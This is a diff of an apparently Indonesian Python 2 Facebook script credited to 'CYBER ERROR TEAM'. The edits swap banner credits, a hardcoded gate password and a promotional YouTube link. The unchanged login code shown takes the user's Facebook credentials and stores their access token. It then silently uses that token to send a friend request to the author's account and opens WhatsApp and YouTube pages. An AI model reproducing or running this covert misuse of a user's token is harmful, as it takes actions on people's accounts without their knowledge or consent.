@@ -52,7 +52,7 @@ logo = """            \x1b[1;91m▇▇▇▇▇▇▇
 █▄█████▄█      \x1b[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●            █ ▼▼▼▼▼  _ --_--╔╦╗┌─┐┬─┐┬┌─  ERROR
 \033[1;95m█  \033[1;95m_-_-- -_ --__ ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗             █ ▲▲▲▲▲-  - _ --═╩╝┴ ┴┴└─┴ ┴   
 █████████      °°°°°°°°°°✧°°°°°°°°°°»
- ██ ██               \033[1;97m╭∩╮(^_^)╭∩╮  \x1b[1;91mSub:sniper dangiang tirta vlog \x1b[1;97m[●]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[●]\n ✫╬─ \x1b[1;92mCYBER ERROR TEAM..   \x1b[1;91m: \x1b[1;93mM.R.0K3T_M.R.R1F4_M.R.1F4N_M.R.D1MZ.M.R.1Z4L                 \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92msorry    \x1b[1;92m \x1b[1;91m: \x1b[1;96mwe are not a hacker   \x1b[1;95m─╬✫\n ✫╬─  \x1b[1;91mthank you \x1b[1;93m: \x1b[1;91mfor using this tools  \x1b[1;97m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+ ██ ██               \033[1;97m╭∩╮(^_^)╭∩╮  \x1b[1;91m \x1b[1;97m[●]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[●]\n ✫╬─ \x1b[1;92mCYBER ERROR TEAM..   \x1b[1;91m: \x1b[1;93m...                 \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92msorry    \x1b[1;92m \x1b[1;91m: \x1b[1;96m...   \x1b[1;95m─╬✫\n ✫╬─  \x1b[1;91mthank you \x1b[1;93m: \x1b[1;91mfor using this tools  \x1b[1;97m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 """
 
 def tik():
@@ -91,7 +91,7 @@ def loginSC():
         os.system('xdg-open https://wa.me/6283826516546 ')
 	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="pecinta" and password =="ulama":
+	if username =="Subscribe" and password =="dulu":
 		print"\033[1;96m[✓] \033[1;92mLogin success.."
 		time.sleep(1)
 		login()
@@ -141,7 +141,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin berhasil sayang..'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://youtu.be/eC74EEpZ3hI ')
+				os.system('xdg-open  https://www.youtube.com/channel/UCxLFXgxj_U1SMlpK0cJ5KZw ')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
